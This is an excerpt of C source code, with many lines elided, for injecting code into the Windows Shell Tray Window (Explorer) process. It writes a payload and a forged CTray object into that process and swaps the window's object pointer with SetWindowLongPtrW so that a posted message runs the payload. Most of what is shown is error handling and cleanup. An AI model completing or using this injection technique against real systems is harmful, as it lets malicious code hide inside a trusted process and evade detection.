...
int main(int argc, const char* argv[]) {
    ...
    if (hp == NULL) {
        PrintError("Unable to open process with PID %d");
        return 1;
    }
    ...
    if (ctp == 0) {
        PrintError("Unable to obtain pointer to CTray object");
        CloseHandle(hp);                 // Close the handle to the target process, freeing resources
        return 1;
    }

    // Read address of the current CTray object
    if (!ReadProcessMemory(hp,           // hProcess: Handle to the target process
        ...
        PrintError("Unable to read memory from process");
        CloseHandle(hp);                 // Close the handle to the target process, freeing resources
        return 1;
    }
    ...
    if (!ReadProcessMemory(hp,           // hProcess: Handle to the target process
        ...
        PrintError("Unable to read virtual table addresses");
        CloseHandle(hp);                 // Close the handle to the target process, freeing resources
        return 1;
    }
    ...
    if (cs == NULL) {
        PrintError("Memory allocation for payload failed");
        CloseHandle(hp);                 // Close the handle to the target process, freeing resources
        return 1;
    }

    // Copy the code to the target process
    if (!WriteProcessMemory(hp,          // hProcess: Handle to the target process
        ...
        PrintError("Unable to write memory to process");
    ...
    if (ds == NULL) {
        PrintError("Memory allocation for CTray object failed");
        // Release the executable memory allocated for the payload code
        VirtualFreeEx(hp,                // hProcess: Handle to the target process
            cs,                          // lpAddress: Address of the allocated memory for the payload code
            0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
    ...
    if (!WriteProcessMemory(hp,          // hProcess: Handle to the target process
        ...
        PrintError("Unable to write CTray object to process memory");
        // Release the executable memory allocated for the payload code
        VirtualFreeEx(hp,                // hProcess: Handle to the target process
            cs,                          // lpAddress: Address of the allocated memory for the payload code
            0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
    ...
    if (SetWindowLongPtrW(hw,            // hWnd: Handle to the Shell Tray Window
        0,                               // nIndex: Index for user data (0 to set the pointer)
        (ULONG_PTR)ds                    // dwNewLong: New pointer to the allocated CTray object
    ) == 0) {
        PrintError("Unable to set new CTray object pointer in Shell Tray Window");
        // Release the executable memory allocated for the payload code
        VirtualFreeEx(hp,                // hProcess: Handle to the target process
            cs,                          // lpAddress: Address of the allocated memory for the payload code
            0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
    ...
    if (!PostMessageW(hw,            // hWnd: Handle to the Shell Tray Window
        ...
        PrintError("Unable to post message to Shell Tray Window");
        // Release the executable memory allocated for the payload code
        VirtualFreeEx(hp,                // hProcess: Handle to the target process
            cs,                          // lpAddress: Address of the allocated memory for the payload code
            0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
    ...
    if (SetWindowLongPtrW(hw,        // hWnd: Handle to the Shell Tray Window
        ...
        PrintError("Unable to restore original CTray object pointer");
        // Release the executable memory allocated for the payload code
        VirtualFreeEx(hp,                // hProcess: Handle to the target process
            cs,                          // lpAddress: Address of the allocated memory for the payload code
            0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
